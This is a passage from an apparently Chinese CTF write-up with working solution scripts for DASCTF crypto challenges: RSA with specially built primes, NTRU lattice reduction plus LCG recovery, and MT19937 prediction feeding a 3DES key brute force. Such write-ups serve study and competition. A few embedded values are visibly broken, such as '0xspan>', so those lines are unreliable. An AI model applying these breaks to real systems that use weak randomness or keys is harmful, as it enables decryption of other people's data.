class="number">931</span>, <span class="number">2073</span>, <span class="number">2793</span>, <span class="number">4837</span>, <span class="number">5741</span>, <span class="number">13129</span>, <span class="number">14511</span>, <span class="number">17223</span>, <span class="number">33859</span>, <span class="number">39387</span>, <span class="number">40187</span>, <span class="number">91903</span>, <span class="number">101577</span>, <span class="number">109079</span>, <span class="number">120561</span>, <span class="number">275709</span>, <span class="number">281309</span>, <span class="number">327237</span>, <span class="number">643321</span>, <span class="number">763553</span>, <span class="number">843927</span>, <span class="number">1929963</span>, <span class="number">2290659</span>, <span class="number">3967031</span>, <span class="number">5344871</span>, <span class="number">11901093</span>, <span class="number">16034613</span>, <span class="number">27769217</span>, <span class="number">75373589</span>, <span class="number">83307651</span>, <span class="number">194384519</span>, <span class="number">226120767</span>, <span class="number">527615123</span>, <span class="number">583153557</span>, <span class="number">1582845369</span>, <span class="number">3693305861</span>, <span class="number">11079917583</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> ed:</span><br><span class="line">    <span class="keyword">if</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65536</span>,<span class="number">131072</span>):</span><br><span class="line">        s = k</span><br><span class="line">        t = e // s</span><br><span class="line">        <span class="keyword">if</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65536</span>,<span class="number">131072</span>) <span class="keyword">and</span> t &gt; s:</span><br><span class="line">            <span class="built_in">print</span>((s,t))</span><br><span class="line">            </span><br><span class="line"><span class="comment"># (91903, 120561)</span></span><br><span class="line"><span class="comment"># (101577, 109079)</span></span><br></pre></td></tr></table></figure><p>带入有 $p=X_1^4+s,q=X_2^4+t$，又 $X_1^4 \gt\gt s,X_2^4 \gt\gt t$，有 $(X_1X_2)^4 \approx N$，即 $X_1X_2= \lfloor\sqrt[4]{N}\rfloor$。结合 $N=pq=(X_1^4+s)(X_2^4+t)$，解 $X_1,X_2$：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">st = [(<span class="number">91903</span>, <span class="number">120561</span>), (<span class="number">101577</span>, <span class="number">109079</span>)]</span><br><span class="line"></span><br><span class="line">N = <span class="number">20289788565671012003324307131062103060859990244423187333725116068731043744218295859587498278382150779775620675092152011336913225797849717782573829179765649320271927359983554162082141908877255319715400550981462988869084618816967398571437725114356308935833701495015311197958172878812521403732038749414005661189594761246154666465178024563227666440066723650451362032162000998737626370987794816660694178305939474922064726534186386488052827919792122844587807300048430756990391177266977583227470089929347969731703368720788359127837289988944365786283419724178187242169399457608505627145016468888402441344333481249304670223</span></span><br><span class="line">e = <span class="number">11079917583</span></span><br><span class="line">c = <span class="number">13354219204055754230025847310134936965811370208880054443449019813095522768684299807719787421318648141224402269593016895821181312342830493800652737679627324687428327297369122017160142465940412477792023917546122283870042482432790385644640286392037986185997262289003477817675380787176650410819568815448960281666117602590863047680652856789877783422272330706693947399620261349458556870056095723068536573904350085124198592111773470010262148170379730937529246069218004969402885134027857991552224816835834207152308645148250837667184968030600819179396545349582556181916861808402629154688779221034610013350165801919342549766</span></span><br><span class="line">s = <span class="built_in">int</span>(st[<span class="number">0</span>][<span class="number">0</span>]) <span class="comment"># 另一组无解</span></span><br><span class="line">t = <span class="built_in">int</span>(st[<span class="number">0</span>][<span class="number">1</span>])</span><br><span class="line">y = <span class="built_in">int</span>(gmpy2.iroot(N,<span class="number">4</span>)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">P.&lt;x1,x2&gt; = PolynomialRing(ZZ)</span><br><span class="line">f1 = (x1^<span class="number">4</span>+s)*(x2^<span class="number">4</span>+t)-N</span><br><span class="line">f2 = x1*x2-y</span><br><span class="line">g = f1.resultant(f2, x2)</span><br><span class="line">X2 = g.univariate_polynomial().roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">X1 = y//X2</span><br><span class="line"><span class="built_in">print</span>((X1,X2))</span><br><span class="line"></span><br><span class="line">p = X1^<span class="number">4</span>+s</span><br><span class="line">q = X2^<span class="number">4</span>+t</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> is_prime(p):</span><br><span class="line">    p = X2^<span class="number">4</span>+s</span><br><span class="line">    q = X1^<span class="number">4</span>+t</span><br><span class="line"><span class="built_in">print</span>(is_prime(p))</span><br><span class="line"><span class="built_in">print</span>(is_prime(q))</span><br><span class="line"></span><br><span class="line"><span class="comment"># AMM</span></span><br><span class="line"><span class="keyword">for</span> mp <span class="keyword">in</span> GF(p)(c).nth_root(e, <span class="built_in">all</span>=<span class="literal">True</span>):</span><br><span class="line">    <span class="keyword">for</span> mq <span class="keyword">in</span> GF(q)(c).nth_root(e, <span class="built_in">all</span>=<span class="literal">True</span>):</span><br><span class="line">        m = crt([ZZ(mp), ZZ(mq)], [p, q])</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res = <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])</span><br><span class="line">            <span class="keyword">if</span> res.isascii():</span><br><span class="line">                <span class="built_in">print</span>(res)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        </span><br><span class="line"><span class="comment"># b&#x27;DASCTF&#123;C0nsTruct!n9_Techn1qUe2_f0r_RSA_Pr1me_EnC2ypt10N&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Easy-3L"><a href="#Easy-3L" class="headerlink" title="Easy_3L"></a>Easy_3L</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_key</span>():</span><br><span class="line">    p = getPrime(<span class="number">1400</span>)</span><br><span class="line">    f = getRandomNBitInteger(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        q = getPrime(<span class="number">512</span>)</span><br><span class="line">        <span class="keyword">if</span> gcd(f, q) != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    h = (invert(f, p) * q) % p</span><br><span class="line">    <span class="keyword">return</span> p, h</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt1</span>(<span class="params">m</span>):</span><br><span class="line">    a = getPrime(<span class="number">250</span>)</span><br><span class="line">    b = getRandomNBitInteger(<span class="number">240</span>)</span><br><span class="line">    n = getPrime(<span class="number">512</span>)</span><br><span class="line">    seed = m</span><br><span class="line">    s = [<span class="number">0</span>] * <span class="number">6</span></span><br><span class="line">    s[<span class="number">0</span>] = seed</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">        s[i] = (s[i - <span class="number">1</span>] * a + b) % n</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt2</span>(<span class="params">msg, p, h</span>):</span><br><span class="line">    s = getRandomNBitInteger(<span class="number">512</span>)</span><br><span class="line">    c = (s * h + msg) % p</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = encrypt1(m)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;S1 =&quot;</span>, s[<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;S2 =&quot;</span>, s[<span class="number">2</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;S4 =&quot;</span>, s[<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;S5 =&quot;</span>, s[<span class="number">5</span>])</span><br><span class="line"></span><br><span class="line">p, h = get_key()</span><br><span class="line">c = encrypt2(s[<span class="number">3</span>], p, h)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p =&quot;</span>, p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;h =&quot;</span>, h)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>, c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># S1 = 28572152986082018877402362001567466234043851789360735202177142484311397443337910028526704343260845684960897697228636991096551426116049875141</span></span><br><span class="line"><span class="comment"># S2 = 1267231041216362976881495706209012999926322160351147349200659893781191687605978675590209327810284956626443266982499935032073788984220619657447889609681888</span></span><br><span class="line"><span class="comment"># S4 = 9739918644806242673966205531575183334306589742344399829232076845951304871478438938119813187502023845332528267974698273405630514228632721928260463654612997</span></span><br><span class="line"><span class="comment"># S5 = 9755668823764800147393276745829186812540710004256163127825800861195296361046987938775181398489372822667854079119037446327498475937494635853074634666112736</span></span><br><span class="line"><span class="comment"># p = 25886434964719448194352673440525701654705794467884891063997131230558866479588298264578120588832128279435501897537203249743883076992668855905005985050222145380285378634993563571078034923112985724204131887907198503097115380966366598622251191576354831935118147880783949022370177789175320661630501595157946150891275992785113199863734714343650596491139321990230671901990010723398037081693145723605154355325074739107535905777351</span></span><br><span class="line"><span class="comment"># h = 2332673914418001018316159191702497430320194762477685969994411366563846498561222483921873160125818295447435796015251682805613716554577537183122368080760105458908517619529332931042168173262127728892648742025494771751133664547888267249802368767396121189473647263861691578834674578112521646941677994097088669110583465311980605508259404858000937372665500663077299603396786862387710064061811000146453852819607311367850587534711</span></span><br><span class="line"><span class="comment"># c = 20329058681057003355767546524327270876901063126285410163862577312957425318547938475645814390088863577141554443432653658287774537679738768993301095388221262144278253212238975358868925761055407920504398004143126310247822585095611305912801250788531962681592054588938446210412897150782558115114462054815460318533279921722893020563472010279486838372516063331845966834180751724227249589463408168677246991839581459878242111459287</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></blockquote><p><code>encrypt1()</code> 和 <code>encrypt2()</code> 分别是LCG和NTRU。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">h = <span class="number">2332673914418001018316159191702497430320194762477685969994411366563846498561222483921873160125818295447435796015251682805613716554577537183122368080760105458908517619529332931042168173262127728892648742025494771751133664547888267249802368767396121189473647263861691578834674578112521646941677994097088669110583465311980605508259404858000937372665500663077299603396786862387710064061811000146453852819607311367850587534711</span></span><br><span class="line">p = <span class="number">25886434964719448194352673440525701654705794467884891063997131230558866479588298264578120588832128279435501897537203249743883076992668855905005985050222145380285378634993563571078034923112985724204131887907198503097115380966366598622251191576354831935118147880783949022370177789175320661630501595157946150891275992785113199863734714343650596491139321990230671901990010723398037081693145723605154355325074739107535905777351</span></span><br><span class="line">c = <span class="number">20329058681057003355767546524327270876901063126285410163862577312957425318547938475645814390088863577141554443432653658287774537679738768993301095388221262144278253212238975358868925761055407920504398004143126310247822585095611305912801250788531962681592054588938446210412897150782558115114462054815460318533279921722893020563472010279486838372516063331845966834180751724227249589463408168677246991839581459878242111459287</span></span><br><span class="line"></span><br><span class="line">v1 = vector(ZZ, [<span class="number">1</span>, h])</span><br><span class="line">v2 = vector(ZZ, [<span class="number">0</span>, p])</span><br><span class="line">m = matrix([v1,v2]);</span><br><span class="line">f, g = m.LLL()[<span class="number">0</span>]</span><br><span class="line">f,g = -f,-g</span><br><span class="line"><span class="built_in">print</span>(f, g)</span><br><span class="line"></span><br><span class="line">a = f*c % p % g</span><br><span class="line">m = a * inverse_mod(f, g) % g</span><br><span class="line"></span><br><span class="line">S1 = <span class="number">28572152986082018877402362001567466234043851789360735202177142484311397443337910028526704343260845684960897697228636991096551426116049875141</span></span><br><span class="line">S2 = <span class="number">1267231041216362976881495706209012999926322160351147349200659893781191687605978675590209327810284956626443266982499935032073788984220619657447889609681888</span></span><br><span class="line">S4 = <span class="number">9739918644806242673966205531575183334306589742344399829232076845951304871478438938119813187502023845332528267974698273405630514228632721928260463654612997</span></span><br><span class="line">S5 = <span class="number">9755668823764800147393276745829186812540710004256163127825800861195296361046987938775181398489372822667854079119037446327498475937494635853074634666112736</span></span><br><span class="line">s = [S1,S2,m,S4,S5]</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modinv</span>(<span class="params">a, m</span>):</span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;modular inverse does not exist&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_unknown_increment</span>(<span class="params">states, modulus, multiplier</span>):</span><br><span class="line">    increment = (states[<span class="number">1</span>] - states[<span class="number">0</span>]*multiplier) % modulus</span><br><span class="line">    <span class="keyword">return</span> modulus, multiplier, increment</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_unknown_multiplier</span>(<span class="params">states, modulus</span>):</span><br><span class="line">    multiplier = (states[<span class="number">2</span>] - states[<span class="number">1</span>]) * modinv(states[<span class="number">1</span>] - states[<span class="number">0</span>], modulus) % modulus</span><br><span class="line">    <span class="keyword">return</span> crack_unknown_increment(states, modulus, multiplier)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_unknown_modulus</span>(<span class="params">states</span>):</span><br><span class="line">    diffs = [s1 - s0 <span class="keyword">for</span> s0, s1 <span class="keyword">in</span> <span class="built_in">zip</span>(states, states[<span class="number">1</span>:])]</span><br><span class="line">    zeroes = [t2*t0 - t1*t1 <span class="keyword">for</span> t0, t1, t2 <span class="keyword">in</span> <span class="built_in">zip</span>(diffs, diffs[<span class="number">1</span>:], diffs[<span class="number">2</span>:])]</span><br><span class="line">    modulus = <span class="built_in">abs</span>(reduce(gcd, zeroes))</span><br><span class="line">    <span class="keyword">return</span> crack_unknown_multiplier(states, modulus)</span><br><span class="line"></span><br><span class="line">n, a, b = crack_unknown_modulus(s)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line">seed = (S1-b)*inverse_mod(a,n)%n</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(seed)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;DASCTF&#123;NTRU_L0G_a6e_S1mpLe&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="SigninCrypto"><a href="#SigninCrypto" class="headerlink" title="SigninCrypto"></a>SigninCrypto</h3><blockquote><p>随机数真随机吗？如随！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES3</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> key <span class="keyword">import</span> key</span><br><span class="line"><span class="keyword">from</span> iv <span class="keyword">import</span> iv</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"></span><br><span class="line">K1= key</span><br><span class="line">hint1 = os.urandom(<span class="number">2</span>) * <span class="number">8</span></span><br><span class="line">xor =bytes_to_long(hint1)^bytes_to_long(K1)</span><br><span class="line"><span class="built_in">print</span>(xor)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Rand</span>():</span><br><span class="line">    rseed = secrets.randbits(<span class="number">1024</span>)</span><br><span class="line">    List1 = []</span><br><span class="line">    List2 = []</span><br><span class="line">    seed(rseed)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">        rand16 = getrandbits(<span class="number">16</span>)</span><br><span class="line">        List1.append(rand16)</span><br><span class="line">    seed(rseed)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">312</span>):</span><br><span class="line">        rand64 = getrandbits(<span class="number">64</span>)</span><br><span class="line">        List2.append(rand64)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;task.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="keyword">for</span> rand16 <span class="keyword">in</span> List1:</span><br><span class="line">            file.write(<span class="built_in">hex</span>(rand16)+ <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> rand64 <span class="keyword">in</span> List2:</span><br><span class="line">            file.write(<span class="built_in">hex</span>((rand64 &amp; <span class="number">0xffff</span>) | ((rand64 &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffff</span>) &lt;&lt; <span class="number">16</span>) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">Rand()</span><br><span class="line"></span><br><span class="line">K2 = long_to_bytes(getrandbits(<span class="number">64</span>))</span><br><span class="line">K3 = flag[:<span class="number">8</span>]</span><br><span class="line"></span><br><span class="line">KEY = K1 + K2 + K3</span><br><span class="line"></span><br><span class="line">IV=iv</span><br><span class="line"></span><br><span class="line">IV1=IV[:<span class="built_in">len</span>(IV)//<span class="number">2</span>]</span><br><span class="line">IV2=IV[<span class="built_in">len</span>(IV)//<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">digest1 = hashlib.sha512(IV1).digest().<span class="built_in">hex</span>()</span><br><span class="line">digest2 = hashlib.sha512(IV2).digest().<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">digest=digest1+digest2</span><br><span class="line">hint2=(bytes_to_long(IV)&lt;&lt;<span class="number">32</span>)^bytes_to_long(os.urandom(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bytes_to_long((digest.encode()))))</span><br><span class="line"><span class="built_in">print</span>(hint2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mode = DES3.MODE_CBC</span><br><span class="line">des3 = DES3.new(KEY, mode, IV)</span><br><span class="line"></span><br><span class="line">pad_len = <span class="number">8</span> - <span class="built_in">len</span>(flag) % <span class="number">8</span></span><br><span class="line">padding = <span class="built_in">bytes</span>([pad_len]) * pad_len</span><br><span class="line">flag += padding</span><br><span class="line"></span><br><span class="line">cipher = des3.encrypt(flag)</span><br><span class="line"></span><br><span class="line">ciphertext=cipher.<span class="built_in">hex</span>()</span><br><span class="line"><span class="built_in">print</span>(ciphertext)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 334648638865560142973669981316964458403</span></span><br><span class="line"><span class="comment"># 0xspan></span><br><span class="line"><span class="comment"># 22078953819177294945130027344</span></span><br><span class="line"><span class="comment"># a6546bd93bced0a8533a5039545a54d1fee647007df106612ba643ffae850e201e711f6e193f15d2124ab23b250bd6e1</span></span><br></pre></td></tr></table></figure></blockquote><p>3DES加密，key由三部分组成，$K_1$ 根据不同位数异或得到random的两个字节值，$K_2$ 利用MT19937算法计算输出值，$K_3$ 为flag前八位，即 <code>&#39;DASCTF&#123;&#39;+?</code>，共需爆破1个可见字符；8字节iv，由sha512结果知前后4字节相同，由hint2知，iv右移4字节后错位异或，hint2高4位即为4字节iv值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> mt19937predictor <span class="keyword">import</span> MT19937Predictor</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES3</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s1 = [...]</span><br><span class="line">s2 = [...]</span><br><span class="line"></span><br><span class="line">predictor = MT19937Predictor()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">312</span>):</span><br><span class="line">    x = (s1[<span class="number">2</span>*i+<span class="number">1</span>]&lt;&lt;<span class="number">48</span>) | ((s2[i]&gt;&gt;<span class="number">16</span>)&lt;&lt;<span class="number">32</span>) | (s1[<span class="number">2</span>*i]&lt;&lt;<span class="number">16</span>) | (s2[i]&amp;<span class="number">0xffff</span>)</span><br><span class="line">    predictor.setrandbits(x, <span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">K2 = long_to_bytes(predictor.getrandbits(<span class="number">64</span>))</span><br><span class="line"><span class="built_in">print</span>(K2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">d = <span class="built_in">bytes</span>.fromhex(<span class="string">&#xx27;</span>)</span><br><span class="line">d1 = d[:<span class="number">128</span>]</span><br><span class="line">d2 = d[<span class="number">128</span>:]</span><br><span class="line"><span class="built_in">print</span>(d1)</span><br><span class="line"><span class="built_in">print</span>(d2)</span><br><span class="line"><span class="built_in">print</span>(d1==d2)</span><br><span class="line"></span><br><span class="line">xor = <span class="number">334648638865560142973669981316964458403</span></span><br><span class="line">hint2 = <span class="number">22078953819177294945130027344</span></span><br><span class="line">c = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;a6546bd93bced0a8533a5039545a54d1fee647007df106612ba643ffae850e201e711f6e193f15d2124ab23b250bd6e1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">hint1 = bytes_to_long(long_to_bytes(xor&gt;&gt;<span class="number">112</span>)*<span class="number">8</span>)</span><br><span class="line">K1 = long_to_bytes(hint1 ^ xor)</span><br><span class="line"><span class="built_in">print</span>(K1)</span><br><span class="line"></span><br><span class="line">iv = hint2&gt;&gt;(<span class="number">8</span>*<span class="number">8</span>)</span><br><span class="line">IV = long_to_bytes(iv)*<span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(IV)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k3 <span class="keyword">in</span> trange(<span class="number">128</span>):</span><br><span class="line">    K3 = <span class="string">b&#x27;DASCTF&#123;&#x27;</span>+<span class="built_in">bytes</span>([k3])</span><br><span class="line">    KEY = K1 + K2 + K3</span><br><span class="line">    des3 = DES3.new(KEY, DES3.MODE_CBC, IV)</span><br><span class="line">    m = des3.decrypt(c)</span><br><span class="line">    <span class="keyword">if</span> m.startswith(<span class="string">b&#x27;DASCTF&#123;&#x27;</span>):</span><br><span class="line">        <span 